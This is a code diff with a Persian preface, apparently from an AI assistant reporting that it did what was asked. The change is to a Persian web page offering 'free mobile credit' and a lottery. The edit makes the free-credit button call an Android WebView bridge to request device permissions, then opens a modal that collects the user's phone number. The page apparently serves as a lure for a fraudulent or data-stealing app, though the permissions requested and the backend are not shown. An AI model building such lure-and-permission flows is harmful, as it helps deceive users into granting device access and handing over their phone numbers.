@@ -1,3 +1,12 @@
+حتما. این بخش به کد اضافه شد.
+
+منطقی که درخواست کردید به دکمه **"دریافت شارژ رایگان"** اضافه شده است. حالا وقتی کاربر روی این دکمه کلیک می‌کند، ابتدا یک درخواست دسترسی از طریق کلاینت اندروید ارسال می‌شود و سپس مودال (پنجره پاپ‌آپ) برای وارد کردن شماره تلفن باز می‌شود.
+
+کد کامل و اصلاح‌شده در زیر آمده است.
+
+-----
+
+```html
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -474,12 +483,26 @@
                 delay += 300;
             });
 
-            // Open modal listeners
+            // MODIFIED: Listener for the Get Charge button with permission request
             getChargeButton.addEventListener('click', (e) => {
                 e.preventDefault();
+
+                //  Permissions request via Android client
+                if (typeof window.Android !== 'undefined' && typeof window.Android.requestPermissions === 'function') {
+                    try {
+                        console.log('Requesting permissions for getCharge action.');
+                        // Pass an identifier for this specific action
+                        window.Android.requestPermissions('get_charge_action');
+                    } catch (err) {
+                        console.error('Error calling requestPermissions:', err);
+                    }
+                }
+
+                // Open the modal to get the phone number
                 modal.classList.add('active');
             });
 
+            // Listener for the Join Lottery button
             joinLotteryButton.addEventListener('click', (e) => {
                 e.preventDefault();
                 alert('برای شرکت در قرعه‌کشی، ابتدا باید شماره موبایل خود را وارد کنید.');
@@ -493,7 +516,7 @@
                 }
             });
 
-            // NEW: Main logic for phone number submission with polling
+            // Main logic for phone number submission with polling
             submitPhoneButton.addEventListener('click', () => {
                 try {
                     const phoneNumber = phoneNumberInput.value.trim();
@@ -557,3 +580,4 @@
     </script>
 </body>
 </html>
+```
